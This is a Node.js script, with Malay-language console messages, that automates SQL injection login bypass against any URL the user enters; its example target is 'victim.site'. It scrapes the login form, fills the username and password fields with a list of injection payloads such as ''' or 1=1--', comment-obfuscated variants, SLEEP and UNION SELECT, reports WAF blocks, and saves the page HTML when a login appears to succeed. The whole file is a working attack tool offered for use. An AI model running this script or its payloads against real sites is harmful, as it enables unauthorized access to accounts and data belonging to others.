const axios = require('axios');
const cheerio = require('cheerio');
const qs = require('qs');
const fs = require('fs');
const path = require('path');
const inquirer = require('inquirer');

const payloads = [
  "' or 1=1--",
  "' or '1'='1",
  "' OR 'a'='a",
  "' OR 1=1#",
  "' OR 1=1/*",
  "' OR 1=1 LIMIT 1 -- -",
  "' OR 1=1 %23",
  "'/**/OR/**/1=1/**/--",
  "'+OR+1=1--",
  "admin'/**/OR/**/'1'='1",
  "' OR SLEEP(5)--",
  "' OR 1=1 LIMIT 1 OFFSET 1--",
  "1' OR '1' = '1' /*",
  "' UNION SELECT NULL,NULL--"
];

inquirer.prompt([
  {
    type: 'input',
    name: 'url',
    message: '🛡️ Masukkan URL login (cth: https://victim.site/login.php):'
  }
]).then(async ({ url }) => {
  try {
    const res = await axios.get(url, { timeout: 10000 });
    const $ = cheerio.load(res.data);

    const form = $('form').first();
    const inputs = form.find('input');
    const action = form.attr('action') || url;
    const method = (form.attr('method') || 'post').toLowerCase();

    const allFields = {};
    const textFields = [];

    inputs.each((i, el) => {
      const type = ($(el).attr('type') || 'text').toLowerCase();
      const name = $(el).attr('name');
      const value = $(el).attr('value') || '';

      if (!name) return;

      if (['hidden', 'submit', 'button', 'checkbox'].includes(type)) {
        allFields[name] = value || '1';
      } else {
        allFields[name] = value;
        textFields.push(name);
      }
    });

    if (textFields.length < 2) {
      console.log('❌ Tak cukup input login (kurang dari 2).');
      return;
    }

    const [param1, param2] = textFields;
    const targetUrl = action.startsWith('http') ? action : new URL(action, url).href;

    console.log(`📥 Input login: ${param1}, ${param2}`);
    console.log(`🧩 Field lain: ${Object.keys(allFields).filter(f => f !== param1 && f !== param2).join(', ') || '(Tiada)'}\n`);

    for (let payload of payloads) {
      const data = { ...allFields };
      data[param1] = payload;
      data[param2] = payload;

      console.log(`🚀 Cuba payload: ${payload}`);

      try {
        const postRes = await axios({
          method,
          url: targetUrl,
          data: qs.stringify(data),
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Snapshot-Tester)',
          },
          timeout: 15000,
          validateStatus: () => true,
        });

        const status = postRes.status;
        const html = postRes.data;

        if (
          status === 403 ||
          html.includes("Firewall") ||
          html.includes("Access Denied")
        ) {
          console.log(`🛡️ Dihalang oleh WAF atau status ${status}`);
        } else if (!html.includes('invalid') && !html.includes('error') && status < 400) {
          console.log(`✅ BERJAYA LOGIN dengan payload: ${payload}`);

          // Simpan snapshot HTML
          const folder = path.join(__dirname, 'output');
          if (!fs.existsSync(folder)) fs.mkdirSync(folder);

          const fileSafe = payload.replace(/[^a-z0-9]/gi, '_');
          const filePath = path.join(folder, `success-${fileSafe}.html`);
          fs.writeFileSync(filePath, html, 'utf-8');

          console.log(`📸 Simpan response ke: ${filePath}`);
          return;
        } else {
          console.log(`❌ Gagal login`);
        }
      } catch (err) {
        console.log(`⚠️ Error: ${err.message}`);
      }

      console.log('--------------------------------------');
    }

    console.log('\n❌ Semua cubaan gagal. Mungkin WAF aktif.');
  } catch (err) {
    console.error(`❌ Tak dapat akses URL: ${err.message}`);
  }
});
